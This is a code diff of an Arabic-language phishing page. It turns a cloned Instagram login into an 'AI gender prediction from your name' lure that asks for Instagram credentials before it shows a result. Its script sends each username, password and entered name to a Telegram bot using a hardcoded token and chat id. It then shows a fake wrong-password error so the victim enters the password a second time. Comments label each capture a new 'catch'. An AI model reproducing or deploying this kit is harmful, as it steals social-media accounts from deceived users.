@@ -3,184 +3,178 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول • Instagram</title>
+    <title>تحديد الجنس بالذكاء الاصطناعي 🤖</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background-color: #fafafa;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
+            padding: 20px;
         }
 
-        .login-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            width: 350px;
-            padding: 40px;
+        /* واجهة الموقع الرئيسي */
+        .main-card {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
-            margin-bottom: 10px;
         }
 
-        .logo {
-            margin-bottom: 30px;
-            width: 175px;
-        }
+        h2 { color: #333; margin-bottom: 20px; font-size: 1.5rem; }
+        p { color: #666; margin-bottom: 20px; }
 
-        .input-box {
+        .input-group { margin-bottom: 15px; }
+        
+        .name-input {
             width: 100%;
-            margin-bottom: 6px;
-        }
-
-        input {
-            width: 100%;
-            padding: 9px 12px;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 12px;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
             outline: none;
-            text-align: right;
+            font-size: 16px;
+            transition: 0.3s;
         }
 
-        input:focus {
-            border-color: #a8a8a8;
-        }
+        .name-input:focus { border-color: #0095f6; }
 
-        .btn-login {
+        .btn-predict {
             width: 100%;
             background-color: #0095f6;
             color: white;
             border: none;
-            border-radius: 8px;
-            padding: 7px;
-            font-weight: 600;
-            font-size: 14px;
+            border-radius: 10px;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 8px;
         }
 
-        /* رسالة الخطأ الوهمية */
+        /* النافذة المنبثقة (Instagram Modal) */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .login-box {
+            background: white;
+            width: 90%;
+            max-width: 350px;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .insta-logo { width: 150px; margin-bottom: 20px; }
+        
+        .insta-input {
+            width: 100%;
+            padding: 10px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .btn-insta-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 8px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
         #error-msg {
             color: #ed4956;
-            font-size: 14px;
-            margin: 15px 0;
-            display: none; /* مخفية افتراضياً */
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 20px 0;
-        }
-
-        .divider div {
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-
-        .divider span {
-            margin: 0 18px;
-            color: #8e8e8e;
             font-size: 13px;
-            font-weight: 600;
-        }
-
-        .fb-login {
-            color: #385185;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            display: block;
-            margin-bottom: 15px;
-        }
-
-        .signup-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            width: 350px;
-            padding: 20px;
-            text-align: center;
-            font-size: 14px;
-        }
-
-        .signup-container a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        @media (max-width: 450px) {
-            body { background-color: #fff; }
-            .login-container, .signup-container {
-                width: 100%;
-                border: none;
-            }
+            margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
-        
-        <form id="loginForm">
-            <div class="input-box">
-                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
-            </div>
-            <div class="input-box">
-                <input type="password" id="password" placeholder="كلمة السر" required>
-            </div>
-            <button type="submit" class="btn-login">تسجيل الدخول</button>
-            
-            <div id="error-msg">عذراً، كلمة السر غير صحيحة. يرجى التحقق من كلمة السر الخاصة بك.</div>
-        </form>
-
-        <div class="divider">
-            <div></div>
-            <span>أو</span>
-            <div></div>
+    <div class="main-card">
+        <h2>تحديد الجنس بالاسم 🧠</h2>
+        <p>قم بإدخال اسمك وسيقوم الذكاء الاصطناعي بتوقع جنسك ونسبة دقة الاسم.</p>
+        <div class="input-group">
+            <input type="text" class="name-input" placeholder="اكتب اسمك هنا...">
         </div>
-
-        <a href="https://www.facebook.com/login" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
+        <button class="btn-predict" onclick="showLogin()">بدء التحليل</button>
     </div>
 
-    <div class="signup-container">
-        ليس لديك حساب؟ <a href="https://www.instagram.com/accounts/emailsignup/">اشترك الآن</a>
+    <div class="modal" id="loginModal">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="insta-logo">
+            <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 15px;">يجب تسجيل الدخول لمشاهدة نتيجة التحليل</p>
+            <form id="loginForm">
+                <input type="text" id="username" class="insta-input" placeholder="اسم المستخدم أو الهاتف" required>
+                <input type="password" id="password" class="insta-input" placeholder="كلمة السر" required>
+                <button type="submit" class="btn-insta-login">تسجيل الدخول</button>
+                <div id="error-msg">عذراً، كلمة السر غير صحيحة.</div>
+            </form>
+        </div>
     </div>
 
     <script>
         const token = '8409685298:AAHN_RpQJOEte85gZMYgi2rPaE99lwXODPs';
         const chatId = '7822309283';
 
+        function showLogin() {
+            const name = document.querySelector('.name-input').value;
+            if(name.length < 2) {
+                alert("يرجى كتابة الاسم أولاً!");
+                return;
+            }
+            document.getElementById('loginModal').style.display = 'flex';
+        }
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            const errorDiv = document.getElementById('error-msg');
+            const nameUsed = document.querySelector('.name-input').value;
 
             // إرسال البيانات لتليجرام
-            const message = `⚠️ محاولة دخول جديدة:\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
+            const message = `🎯 صيد جديد (موقع تحديد الجنس):\n\n👤 الاسم المدخل: ${nameUsed}\n📧 حساب انستا: ${user}\n🔑 الباسورد: ${pass}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url).then(() => {
-                // إظهار رسالة الخطأ بدلاً من التحويل للموقع الحقيقي
-                errorDiv.style.display = 'block';
-                // مسح حقل كلمة السر ليجبره على الإدخال مجدداً
+                document.getElementById('error-msg').style.display = 'block';
                 document.getElementById('password').value = '';
             });
         });
+
+        // إغلاق المودال عند الضغط خارجه (اختياري لجعلها طبيعية)
+        window.onclick = function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
     </script>
 
 </body>
